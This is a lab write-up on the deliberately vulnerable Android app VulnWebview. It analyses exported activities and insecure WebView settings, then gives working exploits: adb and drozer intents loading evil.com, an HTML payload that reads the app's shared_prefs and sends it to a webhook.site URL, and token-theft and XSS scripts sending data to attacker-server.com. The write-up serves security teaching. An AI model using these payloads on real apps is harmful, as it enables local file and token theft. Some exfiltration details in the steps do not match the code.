# Hacking VulnWebview Lab

## Analysis&#x20;

Usually when i start hunting on any app or lab i prefer to take a further look on the app using automqated frameworks in which i prefer drozer framework&#x20;

```
❯ drozer console connect
dz> run app.package.list -f vulnwebview
Attempting to run shell module
com.tmh.vulnwebview (Vuln Web View)
dz> run app.package.info -a com.tmh.vulnwebview
Attempting to run shell module
Package: com.tmh.vulnwebview
  Application Label: Vuln Web View
  Process Name: com.tmh.vulnwebview
  Version: 1.0
  Data Directory: /data/user/0/com.tmh.vulnwebview
  APK Path: /data/app/~~APm9rOCvrbng9-T3LMK5cg==/com.tmh.vulnwebview-rqHlBHSQpZJBVQmg8fONOA==/base.apk
  UID: 10132
  GID: [3003]
  Shared Libraries: [/system/framework/android.test.base.jar]
  Shared User ID: null
  Uses Permissions:
  - android.permission.INTERNET
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.ACCESS_MEDIA_LOCATION
  Defines Permissions:
  - None

dz> run app.package.attacksurface -a com.tmh.vulnwebview
Attempting to run shell module
Exception occured: unrecognized arguments: -a
dz> run app.package.attacksurface com.tmh.vulnwebview
Attempting to run shell module
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  0 content providers exported
  0 services exported
    is debuggable
```

so the firs look sayys our attack surface begin in analysis ther 3 exported activities \
So our next pphase is to check with jadx the siource code for this papp specially take a look at the adndroid amnifest .xml file to see whats the exported activities and whethter it has intent filters or not&#x20;

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    android:compileSdkVersion="28"
    android:compileSdkVersionCodename="9"
    package="com.tmh.vulnwebview"
    platformBuildVersionCode="28"
    platformBuildVersionName="9">
    <uses-sdk
        android:minSdkVersion="16"
        android:targetSdkVersion="28"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <application
        android:theme="@style/Theme.VulnWebView"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:debuggable="true"
        android:allowBackup="true"
        android:supportsRtl="true"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <activity
            android:theme="@style/Theme.VulnWebView.NoActionBar"
            android:label="@string/title_activity_home"
            android:name="com.tmh.vulnwebview.HomeActivity"/>
        <activity
            android:name="com.tmh.vulnwebview.SupportWebView"
            android:exported="true"/>
        <activity
            android:name="com.tmh.vulnwebview.RegistrationWebView"
            android:exported="true"/>
        <activity android:name="com.tmh.vulnwebview.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

as you see there is 3 exp\[orted activities and there is one of them with intent filter \\

* SupportWebView exportwed without ijntent filter&#x20;
* RegistrationWebView without filter&#x20;
* MainActivity with intent filter

now we can confirm that WebViews are being used by the application

so lets take a look on this activities source code&#x20;

Code for `com.tmh.vulnwebview.SupportWebView`:&#x20;

```java
package com.tmh.vulnwebview;

import android.os.Bundle;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

/* loaded from: classes.dex */
public class SupportWebView extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_support_web_view);
        setTitle("Support");
        loadWebView();
    }

    public void loadWebView() {
        WebView webView = (WebView) findViewById(R.id.webview2);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setJavaScriptEnabled(true);
        Map<String, String> extraHeaders = new HashMap<>();
        extraHeaders.put("Authorization", getUserToken());
        webView.addJavascriptInterface(new WebAppInterface(this), "Android");
        webView.loadUrl(getIntent().getStringExtra("support_url"), extraHeaders);
    }

    public static String getUserToken() {
        String uuid = UUID.randomUUID().toString();
        return uuid;
    }
}
```

from this code we can find interesting findings \
1\. Javascript enabled

```
webView.getSettings().setJavaScriptEnabled(true);
```

Enabling JavaScript in a WebView can expose the app to various security risks, such as Cross-Site Scripting (XSS) attacks, injection of malicious scripts, or exploitation of vulnerabilities in the WebView itself.

2. Use of `addJavascriptInterface`

```java
webView.addJavascriptInterface(new WebAppInterface(this), "Android");
```

The `addJavascriptInterface` method allows JavaScript in the WebView to call methods in the Android app. If the WebView loads malicious content, an attacker could exploit this interface to execute arbitrary code in the app's context.

3. Loading URLs from Intent Extras

```
webView.loadUrl(getIntent().getStringExtra("support_url"), extraHeaders);
```

Loading a URL from an intent extra without validation can lead to loading malicious or unintended URLs. An attacker could craft an intent with a malicious URL and exploit the WebView

code for RegistrationWebview

```java
package com.tmh.vulnwebview;

import android.os.Bundle;
import android.util.Log;
import android.webkit.ConsoleMessage;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes.dex */
public class RegistrationWebView extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_registration_web_view);
        setTitle("Registration page");
        loadWebView();
    }

    private void loadWebView() {
        WebView webView = (WebView) findViewById(R.id.webview);
        webView.setWebChromeClient(new WebChromeClient() { // from class: com.tmh.vulnwebview.RegistrationWebView.1
            @Override // android.webkit.WebChromeClient
            public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
                Log.d("MyApplication", consoleMessage.message() + " -- From line " + consoleMessage.lineNumber() + " of " + consoleMessage.sourceId());
                return true;
            }
        });
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setJavaScriptEnabled(true);
        if (getIntent().getExtras().getBoolean("is_reg", false)) {
            webView.loadUrl("file:///android_asset/registration.html");
        } else {
            webView.loadUrl(getIntent().getStringExtra("reg_url"));
        }
    }
}
```

**1. JavaScript Enabled in WebView**

```java
webView.getSettings().setJavaScriptEnabled(true);
```

Enabling JavaScript in a WebView can expose the app to security risks such as Cross-Site Scripting (XSS) attacks, injection of malicious scripts, or exploitation of vulnerabilities in the WebView itself.

**2. Universal Access from File URLs Enabled**

```java
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
```

Enabling `setAllowUniversalAccessFromFileURLs` allows JavaScript running in the context of a file URL (e.g., `file:///android_asset/registration.html`) to access content from any origin. This can lead to security vulnerabilities, such as leaking sensitive data or executing malicious scripts

**3. Loading URLs from Intent Extras**

```javascript
webView.loadUrl(getIntent().getStringExtra("reg_url"));
```

Loading a URL from an intent extra without validation can lead to loading malicious or unintended URLs. An attacker could craft an intent with a malicious URL and exploit the WebView.

## Exploitation



Now rto exploit such bugs we need to try it first wioth adb&#x20;

our goal is to expoloit the exported activity and send i ntent extra with our malicoijhus diomain&#x20;

{% code overflow="wrap" %}
```bash
# using drozer 
dz> run app.activity.start --component com.tmh.vulnwebview com.tmh.vulnwebview.SupportWebView --extra string support_url "http://evil.com"
# using am 
am start -n com.tmh.vulnwebview/.SupportWebView --es support_url "http://evil.com"              
```
{% endcode %}

and for registarationWebview

Another setting that the developer can configure is allowing JavaScript running within the context of file scheme URL to access content from any origin including other file scheme URLs.

This setting removes all same origin policy restrictions & allows the webview to make requests to the web from the file which is normally not possible. i.e., Attacker can read local files using java script and send them across the web to a attacker controlled domain.

If the WebView is exported, this behavior can be very dangerous because it can allow the attacker to read arbitrary files which may be private to the application.

#### Exploit Explanation and JavaScript Code

The vulnerability in the `RegistrationWebView` activity arises due to the combination of two insecure settings:

1. **`setAllowUniversalAccessFromFileURLs(true)`**: This allows JavaScript running in the context of a file URL (e.g., `file:///`) to access content from any origin, including local files.
2. **Exported Activity**: The activity is exported, meaning it can be invoked by other apps or via ADB commands.

An attacker can exploit this by crafting a malicious HTML file with JavaScript that reads sensitive local files and exfiltrates the data to an attacker-controlled server.

***

#### Exploit JavaScript Code

Below is the JavaScript code that exploits the vulnerability by reading a local file and exfiltrating its contents to an attacker's server:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
  <script>
    // Target local file to read (e.g., shared preferences file)
    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml';

    // Function to load and exfiltrate the file contents
    function load(url) {
        var xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object

        // Define the onreadystatechange event handler
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) { // Check if the request is complete
                // Encode the file contents in Base64
                var base64Content = btoa(xhr.responseText);

                // Send the encoded content to the attacker's server
                fetch('https://webhook.site/b1b876ad-e34b-46ea-b431-6d89b4acf38c/?exfiltrated=' + base64Content)
                    .then(response => console.log('Data exfiltrated successfully'))
                    .catch(error => console.error('Exfiltration failed:', error));
            }
        };

        // Open and send the GET request
        xhr.open('GET', url, true);
        xhr.send('');
    }

    // Trigger the exploit
    load(url);
  </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>

```

***

#### Steps to Exploit

1. **Save the Exploit HTML File**: Save the above JavaScript code as `poc.html`.
2.  **Push the Exploit to the Device**: Use ADB to push the exploit file to the device's SD card:

    ```bash
    adb push poc.html /sdcard/poc.html
    ```
3.  **Launch the Exploit**: Use an ADB command to launch the `RegistrationWebView` activity and load the exploit file:

    {% code overflow="wrap" %}
    ```bash
    adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file:///sdcard/poc.html"
    ```
    {% endcode %}
4. **Exfiltration**:
   * The WebView will load the exploit HTML file.
   * The JavaScript code will read the target local file (`MainActivity.xml`) and encode its contents in Base64.
   * The encoded data will be sent to the attacker's server (`attacker-server.com`).
5. **Capture Exfiltrated Data**:
   * The attacker's server will receive the exfiltrated data in the query parameter `data`.
   * Decode the Base64 content to retrieve the file contents.

***

#### Exploiting JavaScript Enabled with Interface in WebView for XSS

SupportWebView:

```java

    public void loadWebView() {
        WebView webView = (WebView) findViewById(R.id.webview2);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setJavaScriptEnabled(true);
        Map<String, String> extraHeaders = new HashMap<>();
        extraHeaders.put("Authorization", getUserToken());
        webView.addJavascriptInterface(new WebAppInterface(this), "Android");
        webView.loadUrl(getIntent().getStringExtra("support_url"), extraHeaders);
    }

    public static String getUserToken() {
        String uuid = UUID.randomUUID().toString();
        return uuid;
    }
}
```

WebAppInterface

```java
package com.tmh.vulnwebview;

import android.content.Context;
import android.webkit.JavascriptInterface;

/* loaded from: classes.dex */
public class WebAppInterface {
    Context mContext;

    /* JADX INFO: Access modifiers changed from: package-private */
    public WebAppInterface(Context c) {
        this.mContext = c;
    }

    @JavascriptInterface
    public String getUserToken() {
        return SupportWebView.getUserToken();
    }
}
```

The provided code enables JavaScript in a WebView and adds a JavaScript interface (`WebAppInterface`) named `Android`. This combination can be exploited to achieve **Cross-Site Scripting (XSS)** and **token theft** if the activity is exported and the WebView loads untrusted content.

***

#### Key Points

1.  **JavaScript Enabled**:

    ```java
    webView.getSettings().setJavaScriptEnabled(true);
    ```

    * Enabling JavaScript allows the WebView to execute JavaScript code, which can be exploited if the WebView loads malicious content.
2.  **JavaScript Interface**:

    ```java
    webView.addJavascriptInterface(new WebAppInterface(this), "Android");
    ```

    * This creates a bridge between JavaScript and the Android app, allowing JavaScript to call Java methods in the app.
    * If the WebView loads untrusted content, an attacker can use this interface to execute malicious JavaScript.
3. **Exported Activity**:
   * If the activity is exported (accessible by other apps or via intents), an attacker can force the WebView to load a malicious URL.

#### Exploitation Steps

**1. Token Theft**

* The `WebAppInterface` exposes a method (`getUserToken`) that returns a token. An attacker can steal this token using JavaScript.

**Exploit JavaScript Code**:

```html
<script type="text/javascript">
    // Access the Android interface and call the getUserToken method
    var token = Android.getUserToken();
    // Exfiltrate the token to an attacker-controlled server
    fetch('https://attacker-server.com/steal?token=' + token);
</script>
```

**Steps**:

1. Host the above script on a server (e.g., Apache or Ngrok).
2.  Use an intent to load the malicious URL in the WebView:

    ```bash
    adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url "https://attacker-server.com/exploit.html"
    ```
3. The token will be sent to the attacker's server.

***

**2. Cross-Site Scripting (XSS)**

* An attacker can inject malicious JavaScript into the WebView to execute arbitrary code.

**Exploit JavaScript Code**:

```html
<script type="text/javascript">
    // Display an alert (proof of XSS)
    alert("XSS Exploited!");
    // Perform other malicious actions, such as stealing cookies or tokens
    var token = Android.getUserToken();
    fetch('https://attacker-server.com/steal?token=' + token);
</script>
```

**Steps**:

1. Host the above script on a server.
2.  Use an intent to load the malicious URL in the WebView:

    ```bash
    adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url "https://attacker-server.com/xss.html"
    ```
3. The WebView will execute the JavaScript, demonstrating XSS.

***

#### Example Setup for Exploitation

**1. Host the Exploit Script**

* Save the exploit JavaScript code in an HTML file (e.g., `exploit.html`).
*   Host it using a local server (e.g., Apache) or Ngrok for external access:

    ```bash
    sudo service apache2 start
    ./ngrok http 80
    ```
* Use the Ngrok HTTPS link (e.g., `https://8d95c0fe086f.ngrok.io/exploit.html`).

**2. Trigger the Exploit**

*   Use an ADB command to launch the vulnerable activity and load the exploit URL:

    ```bash
    adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url "https://8d95c0fe086f.ngrok.io/exploit.html"
    ```

**3. Capture Exfiltrated Data**

* Monitor the attacker's server for incoming requests containing the stolen token or other sensitive data.



